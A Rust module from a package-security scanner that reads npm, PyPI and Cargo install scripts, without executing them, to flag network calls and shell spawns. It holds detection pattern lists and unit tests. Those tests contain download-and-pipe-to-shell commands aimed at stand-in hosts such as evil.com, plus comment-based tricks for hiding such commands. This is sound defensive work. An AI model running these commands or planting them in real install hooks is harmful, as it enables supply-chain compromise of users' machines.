//! M6 ch6 — install-script analysis (read-only, never executes).
//!
//! Token-level scan for network-call and shell-spawn patterns inside install
//! lifecycle scripts: npm `package.json` lifecycle hooks (preinstall / install /
//! postinstall / prepare), PyPI `setup.py` + `pyproject.toml [project.scripts]`,
//! and Cargo `build.rs`.
//!
//! Contract: (1) read-only — never executes; (2) no fetch — operates only on
//! text already on disk or inline in a registry-API response (tirith never
//! downloads a package to inspect it); (3) per-ecosystem scope — npm responses
//! carry `scripts.{...}` inline (lockfile + installed), PyPI/crates.io do not, so
//! installed-tree mode only.
//!
//! Heuristic: token-level matching with string-literal awareness reduces but
//! does not eliminate false positives (a `curl` in a comment can match).

use crate::package_risk::InstallScriptSignals;

const NPM_INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
const MAX_NPM_PACKAGE_JSON_BYTES: u64 = 1024 * 1024;

/// One bounded, parsed snapshot of npm lifecycle scripts from disk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NpmLifecycleScripts {
    /// Non-empty lifecycle keys present in the manifest.
    pub hook_names: Vec<String>,
    /// The corresponding bodies, concatenated for [`analyze_script_text`].
    pub script_text: String,
}

/// Token-level scan of `script_text` (one script, or all applicable npm hooks
/// concatenated) for network calls and shell spawns. Pure: no I/O.
pub fn analyze_script_text(script_text: &str) -> InstallScriptSignals {
    let mut signals = InstallScriptSignals::default();
    if script_text.is_empty() {
        return signals;
    }

    // npm selects the lifecycle shell by platform/configuration. A leading `#`
    // is a comment in a POSIX shell but ordinary command text under cmd.exe;
    // `//` can likewise begin an executable POSIX path. Without a bound runtime
    // grammar, conservatively scan every line. This can retain a comment-only
    // false positive, but it cannot erase an executable cross-platform suffix.
    for line in script_text.lines() {
        let body = line.trim_start();
        let lower = body.to_lowercase();

        if NETWORK_CALL_PATTERNS.iter().any(|p| token_match(&lower, p)) {
            signals.has_network_call = true;
            signals
                .suspicious_patterns
                .push(format!("network call: {}", body.trim()));
        }
        if SHELL_SPAWN_PATTERNS.iter().any(|p| token_match(&lower, p)) {
            signals.has_shell_spawn = true;
            signals
                .suspicious_patterns
                .push(format!("shell spawn: {}", body.trim()));
        }
    }

    // Cap descriptions to keep the JSON shape bounded.
    const MAX_DESC: usize = 5;
    if signals.suspicious_patterns.len() > MAX_DESC {
        signals.suspicious_patterns.truncate(MAX_DESC);
    }
    signals
}

/// Network-call token patterns (boundary-matched via `token_match`, so
/// "curlydocs" does not match "curl").
const NETWORK_CALL_PATTERNS: &[&str] = &[
    "curl",
    "wget",
    "fetch",
    "http.get",
    "https.get",
    "request(",
    "axios.",
    "urllib",
    "requests.get",
    "requests.post",
    "urlretrieve",
    "downloadfile",
    "invoke-webrequest",
    "invoke-restmethod",
    "iwr ",
    "irm ",
];

/// Shell-spawn token patterns.
const SHELL_SPAWN_PATTERNS: &[&str] = &[
    " | sh",
    " | bash",
    "bash -c",
    "sh -c",
    "system(",
    "spawn(",
    "subprocess.run",
    "subprocess.popen",
    "subprocess.call",
    "process.spawn",
    "node-gyp",
];

/// `true` when `haystack` contains `needle` at a token boundary, so "curl" does
/// not match "curly".
fn token_match(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    // Patterns already containing a space/paren/pipe are their own boundary.
    if needle.contains(' ')
        || needle.contains('(')
        || needle.contains('|')
        || needle.ends_with('.')
        || needle.contains('-')
    {
        return haystack.contains(needle);
    }
    // Otherwise require a boundary on each side of the match.
    for (idx, _) in haystack.match_indices(needle) {
        let before_ok = if idx == 0 {
            true
        } else {
            let prev = haystack.as_bytes()[idx - 1];
            !(prev.is_ascii_alphanumeric() || prev == b'_')
        };
        let after = idx + needle.len();
        let after_ok = if after == haystack.len() {
            true
        } else {
            let next = haystack.as_bytes()[after];
            !(next.is_ascii_alphanumeric() || next == b'_')
        };
        if before_ok && after_ok {
            return true;
        }
    }
    false
}

/// Concatenate the npm install-lifecycle script bodies from a `package.json`
/// value for [`analyze_script_text`], or `None` if none are defined.
pub fn npm_script_text(package_json: &serde_json::Value) -> Option<String> {
    let scripts = package_json.get("scripts")?.as_object()?;
    let mut out = String::new();
    for hook in NPM_INSTALL_HOOKS {
        if let Some(body) = scripts.get(*hook).and_then(|v| v.as_str()) {
            if !body.trim().is_empty() {
                out.push_str(body);
                out.push('\n');
            }
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Open and parse one bounded `package.json` snapshot, retaining both hook
/// identities and bodies so installed-tree callers never read it twice.
pub fn npm_lifecycle_scripts_from_disk(
    package_json_path: &std::path::Path,
) -> Result<Option<NpmLifecycleScripts>, String> {
    let bytes = match crate::util::read_text_no_follow_capped(
        package_json_path,
        MAX_NPM_PACKAGE_JSON_BYTES,
    ) {
        Ok(bytes) => bytes,
        Err(crate::util::OpenRegularError::NotFound) => return Ok(None),
        Err(
            crate::util::OpenRegularError::NotRegularFile | crate::util::OpenRegularError::TooLarge,
        ) => {
            return Err(format!(
                "package.json is not a regular file bounded to {MAX_NPM_PACKAGE_JSON_BYTES} bytes"
            ));
        }
        Err(crate::util::OpenRegularError::Io(error)) => {
            return Err(format!("cannot read package.json: {error}"));
        }
    };
    let content = String::from_utf8(bytes)
        .map_err(|error| format!("package.json is not valid UTF-8: {error}"))?;
    let package_json: serde_json::Value = serde_json::from_str(&content)
        .map_err(|error| format!("package.json is not valid JSON: {error}"))?;
    let scripts = package_json
        .get("scripts")
        .and_then(|value| value.as_object());
    let mut hook_names = Vec::new();
    let mut script_text = String::new();
    for hook in NPM_INSTALL_HOOKS {
        if let Some(body) = scripts
            .and_then(|scripts| scripts.get(*hook))
            .and_then(serde_json::Value::as_str)
        {
            if !body.trim().is_empty() {
                hook_names.push((*hook).to_string());
                script_text.push_str(body);
                script_text.push('\n');
            }
        }
    }

    let overrides_implicit_gyp = ["preinstall", "install"].iter().any(|hook| {
        scripts
            .and_then(|scripts| scripts.get(*hook))
            .and_then(serde_json::Value::as_str)
            // npm uses JavaScript truthiness here: whitespace suppresses the
            // default, while the empty string still permits node-gyp rebuild.
            .is_some_and(|body| !body.is_empty())
    });
    let gypfile_enabled = package_json
        .get("gypfile")
        .and_then(serde_json::Value::as_bool)
        != Some(false);
    if gypfile_enabled && !overrides_implicit_gyp {
        let binding_gyp = package_json_path
            .parent()
            .unwrap_or_else(|| std::path::Path::new("."))
            .join("binding.gyp");
        match crate::util::open_read_no_follow_capped(&binding_gyp, u64::MAX) {
            Ok(_) => {
                hook_names.push("implicit binding.gyp install".to_string());
                script_text.push_str("node-gyp rebuild\n");
            }
            Err(crate::util::OpenRegularError::NotFound) => {}
            Err(crate::util::OpenRegularError::NotRegularFile) => {
                return Err("binding.gyp exists but is not a regular no-follow file".to_string());
            }
            Err(crate::util::OpenRegularError::TooLarge) => {
                return Err("binding.gyp could not be bounded for inspection".to_string());
            }
            Err(crate::util::OpenRegularError::Io(error)) => {
                return Err(format!("cannot inspect binding.gyp: {error}"));
            }
        }
    }
    if hook_names.is_empty() {
        Ok(None)
    } else {
        Ok(Some(NpmLifecycleScripts {
            hook_names,
            script_text,
        }))
    }
}

/// Compatibility helper returning only the bounded script text. Callers that
/// need to distinguish unavailable analysis use [`npm_lifecycle_scripts_from_disk`].
pub fn npm_script_text_from_disk(package_json_path: &std::path::Path) -> Option<String> {
    npm_lifecycle_scripts_from_disk(package_json_path)
        .ok()
        .flatten()
        .map(|scripts| scripts.script_text)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_script_text_no_signals() {
        let s = analyze_script_text("");
        assert!(!s.fires());
    }

    #[test]
    fn curl_pipe_sh_detects_both_network_and_shell_spawn() {
        let s = analyze_script_text("curl https://evil.com/payload.sh | sh");
        assert!(s.has_network_call, "curl is a network call");
        assert!(s.has_shell_spawn, "| sh is a shell spawn");
        assert!(s.fires());
    }

    #[test]
    fn leading_hash_cannot_hide_windows_command_separator() {
        let s = analyze_script_text("# & curl https://evil.example/p | sh\n");
        assert!(
            s.has_network_call,
            "a leading hash is not a comment under cmd.exe"
        );
        assert!(s.has_shell_spawn, "the command suffix must remain visible");
    }

    #[test]
    fn quoted_hash_cannot_hide_later_executable_text() {
        let s = analyze_script_text("printf '#'; curl https://evil.example/p | sh");
        assert!(
            s.has_network_call,
            "curl after a quoted hash must be scanned"
        );
        assert!(s.has_shell_spawn, "the pipe-to-shell must remain visible");
    }

    #[test]
    fn double_slash_executable_prefix_is_not_treated_as_a_comment() {
        let s = analyze_script_text("//bin/sh -c 'curl https://evil.example/p | sh'");
        assert!(
            s.has_network_call,
            "an executable // path must not hide a network call"
        );
        assert!(
            s.has_shell_spawn,
            "an executable // path must not hide a shell spawn"
        );
    }

    #[test]
    fn wget_detects_network_call() {
        let s = analyze_script_text("wget -O- https://example.com/script | bash");
        assert!(s.has_network_call);
        assert!(s.has_shell_spawn);
    }

    #[test]
    fn token_match_does_not_match_substring() {
        assert!(!token_match("curly", "curl"));
        assert!(token_match("curl ", "curl"));
        assert!(token_match("curl;", "curl"));
        assert!(token_match("curl\n", "curl"));
        assert!(token_match("./curl", "curl"));
    }

    #[test]
    fn npm_script_text_concats_hooks() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": {
                "preinstall": "echo pre",
                "postinstall": "curl evil.com",
                "test": "jest"
            }
        });
        let text = npm_script_text(&pkg).expect("hooks present");
        assert!(text.contains("echo pre"));
        assert!(text.contains("curl evil.com"));
        assert!(!text.contains("jest"));
    }

    #[test]
    fn npm_script_text_returns_none_when_no_hooks() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": { "test": "jest" }
        });
        assert!(npm_script_text(&pkg).is_none());
    }

    #[test]
    fn npm_script_text_returns_none_for_empty_string_hook() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": { "postinstall": "   " }
        });
        assert!(npm_script_text(&pkg).is_none());
    }

    #[test]
    fn npm_disk_snapshot_models_implicit_binding_gyp_install() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        std::fs::write(
            &manifest,
            r#"{"name":"native","gypfile":true,"scripts":{}}"#,
        )
        .unwrap();
        std::fs::write(directory.path().join("binding.gyp"), "{'targets': []}").unwrap();

        let scripts = npm_lifecycle_scripts_from_disk(&manifest)
            .unwrap()
            .expect("binding.gyp implies an install lifecycle");
        assert!(scripts
            .hook_names
            .iter()
            .any(|hook| hook.contains("implicit binding.gyp")));
        let signals = analyze_script_text(&scripts.script_text);
        assert!(signals.has_shell_spawn);
        assert!(signals
            .suspicious_patterns
            .iter()
            .any(|pattern| pattern.contains("node-gyp rebuild")));
    }

    #[test]
    fn npm_disk_snapshot_honors_gypfile_false_control() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        std::fs::write(
            &manifest,
            r#"{"name":"prebuilt","gypfile":false,"scripts":{}}"#,
        )
        .unwrap();
        std::fs::write(directory.path().join("binding.gyp"), "{'targets': []}").unwrap();

        assert!(npm_lifecycle_scripts_from_disk(&manifest)
            .unwrap()
            .is_none());
    }

    #[test]
    fn npm_disk_snapshot_whitespace_install_suppresses_implicit_binding_gyp() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        std::fs::write(&manifest, r#"{"name":"native","scripts":{"install":" "}}"#).unwrap();
        std::fs::write(directory.path().join("binding.gyp"), "{'targets': []}").unwrap();

        assert!(npm_lifecycle_scripts_from_disk(&manifest)
            .unwrap()
            .is_none());
    }

    #[test]
    fn npm_disk_snapshot_empty_install_keeps_implicit_binding_gyp() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        std::fs::write(&manifest, r#"{"name":"native","scripts":{"install":""}}"#).unwrap();
        std::fs::write(directory.path().join("binding.gyp"), "{'targets': []}").unwrap();

        let scripts = npm_lifecycle_scripts_from_disk(&manifest)
            .unwrap()
            .expect("empty install does not suppress npm's implicit binding.gyp hook");
        assert!(scripts.script_text.contains("node-gyp rebuild"));
    }

    #[test]
    fn npm_disk_snapshot_defaults_binding_gyp_to_enabled() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        std::fs::write(&manifest, r#"{"name":"native","scripts":{}}"#).unwrap();
        std::fs::write(directory.path().join("binding.gyp"), "{'targets': []}").unwrap();

        assert!(npm_lifecycle_scripts_from_disk(&manifest)
            .unwrap()
            .is_some());
    }

    #[test]
    #[cfg(unix)]
    fn npm_disk_snapshot_refuses_symlinked_binding_gyp() {
        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        std::fs::write(&manifest, r#"{"name":"native","scripts":{}}"#).unwrap();
        let target = directory.path().join("outside.gyp");
        std::fs::write(&target, "{'targets': []}").unwrap();
        std::os::unix::fs::symlink(&target, directory.path().join("binding.gyp")).unwrap();

        let error = npm_lifecycle_scripts_from_disk(&manifest)
            .expect_err("a symlinked binding.gyp must make analysis unavailable");
        assert!(error.contains("not a regular no-follow file"));
    }

    #[test]
    #[cfg(unix)]
    fn npm_disk_snapshot_refuses_a_symlinked_manifest() {
        let directory = tempfile::tempdir().unwrap();
        let target = directory.path().join("target.json");
        std::fs::write(
            &target,
            r#"{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}"#,
        )
        .unwrap();
        let manifest = directory.path().join("package.json");
        std::os::unix::fs::symlink(&target, &manifest).unwrap();

        let error = npm_lifecycle_scripts_from_disk(&manifest)
            .expect_err("a symlinked package.json must never be followed");
        assert!(error.contains("not a regular file bounded"));
    }

    #[test]
    #[cfg(unix)]
    fn npm_disk_snapshot_refuses_a_fifo_without_blocking() {
        use std::os::unix::ffi::OsStrExt as _;
        use std::time::{Duration, Instant};

        let directory = tempfile::tempdir().unwrap();
        let manifest = directory.path().join("package.json");
        let path = std::ffi::CString::new(manifest.as_os_str().as_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(path.as_ptr(), 0o600) }, 0);

        let started = Instant::now();
        let error = npm_lifecycle_scripts_from_disk(&manifest)
            .expect_err("a FIFO package.json must be refused");
        assert!(started.elapsed() < Duration::from_secs(1));
        assert!(error.contains("not a regular file bounded"));
    }

    #[test]
    fn python_subprocess_run_is_shell_spawn() {
        let s = analyze_script_text("import subprocess\nsubprocess.run(['sh', '-c', 'echo hi'])");
        assert!(s.has_shell_spawn);
    }

    #[test]
    fn clean_build_script_does_not_fire() {
        let s = analyze_script_text(
            "fn main() {\n    println!(\"cargo:rerun-if-changed=src/main.rs\");\n}\n",
        );
        assert!(!s.fires(), "a clean build script must not fire");
    }
}
